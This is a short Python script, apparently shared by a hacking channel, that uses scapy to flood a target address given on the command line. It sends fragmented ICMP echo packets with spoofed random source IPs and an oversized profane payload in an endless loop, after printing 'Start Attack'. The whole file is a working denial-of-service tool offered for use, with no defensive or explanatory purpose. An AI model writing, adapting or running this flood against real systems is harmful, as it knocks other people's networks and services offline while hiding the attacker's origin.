#! /usr/bin/env python3
# Channel RemaxBoxTeam
# lhashashinl <--M-->
from scapy.all import *
from scapy import *
import socket,sys


def ping(Target):
    print("\033[92m Start Attack ...")
    send(fragment(IP(dst=Target,src=RandIP(),id=1111,ttl=99)/ICMP(type=8,code=0)/("FUCK"*10000)),loop=1)
    


ping(Target=sys.argv[1])
